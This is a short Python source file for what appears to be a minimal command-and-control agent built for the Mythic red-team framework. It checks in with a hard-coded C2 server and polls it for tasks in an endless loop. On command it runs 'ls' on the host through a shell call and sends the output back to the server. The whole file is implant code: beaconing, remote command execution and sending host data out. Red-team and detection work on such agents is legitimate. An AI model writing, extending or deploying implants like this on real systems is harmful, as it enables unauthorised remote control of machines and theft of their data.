import os
import base64
import requests
import json
import time
from .c2_profiles.http import HTTPC2Profile

# Configuration
C2_SERVER = "http://192.168.79.6:8080"
AGENT_UUID = "basic-agent-001"

def main():
    """Main agent loop to maintain connection and execute tasks."""
    c2 = HTTPC2Profile(server=C2_SERVER)
    
    # Check in with Mythic server
    checkin_payload = {
        "uuid": AGENT_UUID,
        "os": "Linux",
        "architecture": "x64"
    }
    checkin_response = c2.checkin(checkin_payload)
    if not checkin_response or "task_id" not in checkin_response:
        print("Failed to check in. Exiting.")
        return
    
    task_id = checkin_response["task_id"]
    
    while True:
        # Fetch tasks
        task = c2.get_task(task_id)
        if task and "command" in task and task["command"] == "ls":
            # Execute ls command
            try:
                output = os.popen("ls").read()
            except Exception as e:
                output = f"Error executing ls: {e}"
            # Send response
            c2.send_response(task_id, output)
        time.sleep(5)  # Sleep to avoid overwhelming the server

if __name__ == "__main__":
    main()